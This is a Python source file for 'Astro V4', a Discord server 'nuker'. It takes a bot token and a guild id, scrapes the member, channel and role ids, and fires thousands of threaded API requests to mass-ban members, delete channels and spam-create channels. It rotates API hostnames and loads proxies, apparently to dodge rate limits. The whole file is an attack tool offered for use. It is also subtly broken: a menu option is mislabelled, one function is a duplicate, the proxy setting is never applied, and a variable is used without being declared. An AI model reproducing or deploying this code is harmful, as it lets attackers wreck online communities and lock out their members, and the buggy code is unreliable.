import os
import sys
import time
import httpx
import queue
import random
import discord
import threading
from pystyle import Colorate, Colors
from discord.ext import commands

intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix = "astro!",case_insensitive = False,bot = True,intents=intents)
amount = 0

class astro:
    if os.name == "nt":
       os.system("cls")
    else:
       terminal_title = "Astro V4 - Made by horrid"
       print(f'\33]0;{terminal_title}\a', end='', flush=True)
       os.system("clear")

    logo = f'''
                                                              - Astro V4 -
                                                     ___
                                                  ,o88888
                                               ,o8888888'
                         ,:o:o:oooo.        ,8O88Pd8888"                             :::      :::::::: ::::::::::: :::::::::   ::::::::
                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"                            +:+   +:+  +:+           +:+     +:+    +:+ +:+    +:+
                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"                            +#++:++#++: +#++:++#++    +#+     +#++:++#:  +#+    +:+
                 , ..:.::o:ooOoOO8O888O8O,COCOO"                             +#+     +#+        +#+    +#+     +#+    +#+ +#+    +#+
                , . ..:.::o:ooOoOOOO8OOOOCOCO"                              ###     ###  ########     ###     ###    ###  ########
                 . ..:.::o:ooOoOoOO8O8OCCCC"o
                    . ..:.::o:ooooOoCoCCC"o:o                                                    --------------
                    . ..:.::o:o:,cooooCo"oo:o:                                               _   __      __
                 `   . . ..:.:cocoooo"'o:o:::'                                              / | / /_  __/ /_____  _____
                 .`   . ..::ccccoc"'o:o:o:::'                                              /  |/ / / / / //_/ _ \/ ___/
                :.:.    ,c:cccc"':.:.:.:.:.'                                              / /|  / /_/ / ,< /  __/ /
              ..:.:"'`::::c:"'..:.:.:.:.:.'                                              /_/ |_/\__,_/_/|_|\___/_/
            ...:.'.:.::::"'    . . . . .'
           .. . ....:."' `   .  . . ''
         . . . ...."'
         .. . ."'
        .


> astro.cybin.cc
> made by horrid
---------------------------------------------------------------------------------------------------------------------------------------------

                                 $ That's one small step for man, one giant leap for mankind. - Armstrong $

---------------------------------------------------------------------------------------------------------------------------------------------
                                                                    Log:

'''
    print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - loading script...", 1))
    time.sleep(5)
    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - done, press enter to start.", 1))
    input()
    if os.name == "nt":
       os.system("title Astro-V4")
       os.system("cls")
    else:
       terminal_title = "Astro V4 | Made by horrid"
       print(f'\33]0;{terminal_title}\a', end='', flush=True)
       os.system("clear")
    print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
    token = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter token: \u001b[0m", 1))
    guild = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter guild id: \u001b[0m", 1))
    channame = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter channel name: \u001b[0m", 1))
    option = []
    headers = {"Authorization": f"Bot {token}"}
    q = queue.Queue()
    apiv = ["v9", "v6"]
    count = 0
    jsonparam = {"name": channame}

    def chandelreqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                if s.status_code == 404:
                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - deleted a total of {astro.count} channels.", 1))
                    for i in range(400):
                        input()
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel deleted - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def chancrereqsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers, data=astro.jsonparam)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel created - status code: {s.status_code} - time: {time.ctime()}", 1))
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(err)
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def massbansend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                    for i in range(50):
                        input()
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def chandelsend():
        try:
            while True:
                req, url, headers = astro.q.get()
                p = open("proxies.txt", "r")
                pr = p.readlines()
                proxy = {"HTTP": f"http://{random.choice(pr)}"}
                s = req(url, headers=headers)
                astro.count += 1
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} banned member - status code: {s.status_code} - time: {time.ctime()}", 1))
                if s.text == '{"message": "Max number of bans for non-guild members have been exceeded. Try again later", "code": 30035}':
                    print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - maximum non-guilded ban members has been exceded, change the entire bot, please exit by yourself.", 1))
                    for i in range(50):
                        input()
                astro.q.task_done()
        except Exception as err:
            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
            else:
                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))

    def idworker():
        for memberid in open("scraped/ids.txt"):
            ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}"]
            astro.q.put((httpx.put, random.choice(ranidapi), astro.headers))
        astro.q.join()

    def massbanworker():
        for member in open("scraped/scraped.txt"):
            ranapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
            astro.q.put((httpx.put, random.choice(ranapi), astro.headers))
            amount += 1
            os.system(f"title AstroV4 - Bans: {amount}")
        astro.q.join()

    def channeldelworker():
        for channel in open("scraped/channels.txt"):
            ranchanapi = [f"https://discord.com/api/v9/channels/{channel}", f"https://discordapp.com/api/v9/channels/{channel}", f"https://canary.discord.com/api/v9/channels/{channel}", f"https://ptb.discord.com/api/v9/channels/{channel}"]
            astro.q.put((httpx.delete, random.choice(ranchanapi), astro.headers))

    def channelmakeworker():
        for i in range(1000):
            ranchancrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/channels/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/channels"]
            astro.q.put((httpx.post, random.choice(ranchancrapi), astro.headers))

    @client.event
    async def on_connect():
        try:
            guild = await client.fetch_guild(int(astro.guild))
            id = client.get_guild(int(astro.guild))
        except:
            print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - guild id is invalid", 1))
            input()
            os._exit(0)
        print("astro@localhost - scraping..")
        members = await guild.chunk()
        print("astro@localhost - done.")
        with open('scraped/channels.txt', 'a') as c:
            for channel in id.channels:
                c.write(f"{channel.id}\n")
        with open("scraped/roles.txt", "a") as o:
            for role in id.roles:
                o.write(f"{role.id}\n")
        with open('scraped/scraped.txt', 'a') as z:
            for member in members:
                z.write(str(member.id) + "\n")
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [1] massban ids?", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [2] massban scraped?", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [3] delete channels?", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [4] delete roles?", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [5] make channels? (UNFINISHED)", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [6] spam channels (UNFINISHED)", 1))
        option = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - choice: \u001b[0m", 1))
        if option == "1":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            print(astro.option)
            astro.idworker()
            for x in range(1000):
                threading.Thread(target=astro.massbansend, daemon=True).start()
        if option == "2":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            print(astro.option)
            astro.massbanworker()
            for x in range(1000):
                threading.Thread(target=astro.massbansend, daemon=True).start()
        if option == "3":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            print(astro.option)
            astro.channeldelworker()
            for x in range(1000):
                threading.Thread(target=astro.chandelreqsend, daemon=True).start()
        if option == "4":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
            time.sleep(5)
            print(astro.option)
            astro.channelmakeworker()
            for x in range(1000):
                threading.Thread(target=astro.chancrereqsend, daemon=True).start()

if __name__ == "__main__":
    try:
        client.run(astro.token)
    except:
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - token is invalid or ratelimited.", 1))
        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - please make sure you have all intents enabled on your bots token.", 1))
        input()
        exit()
